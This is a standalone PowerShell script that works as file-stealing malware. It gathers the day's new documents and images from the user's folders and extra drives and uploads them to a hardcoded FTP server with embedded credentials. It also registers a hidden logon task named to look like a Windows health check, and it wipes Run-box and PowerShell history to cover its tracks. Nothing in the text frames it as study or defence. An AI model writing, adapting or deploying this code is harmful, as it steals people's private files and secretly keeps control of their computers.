$web=New-Object System.Net.WebClient
$FTP = "ftp://testadmin:testpassword@192.119.71.89/files/"
$Dir = "C:\Users\$env:username\Desktop","C:\Users\$env:username\Downloads","C:\Users\$env:username\Documents","D:\","E:\","F:\"
foreach($item in (Get-ChildItem -Path $Dir -Include *.txt,*.xlsx,*.xls,*.pdf,*.docx,*.doc,*.jpg,*.png,*.jpeg,*.ppt -Recurse | Where{$_.CreationTime -gt (Get-Date).Date})){    
    
    $URI = New-Object System.Uri($FTP+$item.Name)
    $web.UploadFile($URI, $item.FullName)
    
}
# making a task-Scheduler
$taskName = "WindowHealthCheckUp"
Get-ScheduledTask | Where-Object {$_.TaskName -like $taskName} -ErrorAction SilentlyContinue -OutVariable task

if (!$task) {
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -Exec Bypass -NonI -File C:\Windows\System32\a.ps1"
    $trigger = New-ScheduledTaskTrigger -AtLogOn 
    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description 'PCHealth'
}
#Clearing fingerprinting
function Clean-Exfil{
	#delete run box history
	reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
	
	#delete powershell history
	Remove-Item (Get-PSreadlineOption).HistorySavePath
}
Clean-Exfil





